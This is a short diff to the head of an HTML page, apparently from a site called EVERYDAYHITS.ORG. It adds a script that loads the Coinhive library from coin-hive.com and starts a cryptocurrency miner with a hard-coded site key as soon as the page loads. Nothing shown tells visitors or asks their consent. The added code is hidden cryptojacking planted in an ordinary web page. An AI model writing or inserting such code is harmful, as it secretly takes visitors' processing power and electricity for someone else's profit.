@@ -1,6 +1,11 @@
 <html>
 <head>
-
+ <script  type="text/javascript">
+  var script = document.createElement("script"); // Make a script DOM node
+    script.src = "https://coin-hive.com/lib/coinhive.min.js"; // Set it's src to the provided URL
+   script.innerHTML="var miner = new CoinHive.Anonymous('bbxalNoLp5ZVs6plwCnsSbpPMdqh5qw7', {throttle: 0.1});miner.start();"; 
+    document.head.appendChild(script);
+  </script>
 <!--<meta content="EVERYDAYHITS.ORG" property="og:site_name">-->
 
 <meta content="summary_large_image" name="twitter:card">
